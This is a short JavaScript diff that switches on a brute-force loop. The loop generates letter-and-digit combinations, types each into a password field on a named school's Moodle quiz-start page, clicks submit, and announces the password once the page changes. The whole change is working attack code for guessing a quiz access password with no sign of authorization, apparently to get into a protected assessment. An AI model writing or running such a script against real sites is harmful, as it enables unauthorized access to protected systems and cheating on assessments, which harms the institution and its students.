@@ -30,16 +30,15 @@ function * combinations (...options) {
         yield values.join("");
     }
 }
-console.log(Array.from(combinations("ABC", "abc", "123")));
+//console.log(Array.from(combinations("ABC", "abc", "123")));
 
-/*
-for (let word of combinations(alphabet.toUpperCase(), alphabet, alphabet, "0123456789")) {
+
+for (let word of combinations(alphabet.toUpperCase(), alphabet, "0123456789")) {
     document.getElementsByTagName('input')[3].value = word
     document.getElementsByTagName('input')[4].click()
     if (document.URL != "https://moodle.cedarsupper.org.uk/moodle/mod/quiz/startattempt.php") {
-        console.log("The password was:", word);
+        prompt("Finished, found password to be", word);
         break;
     }
 }
-console.log("No match found");
-*/
+prompt("Press 'OK' to reload")
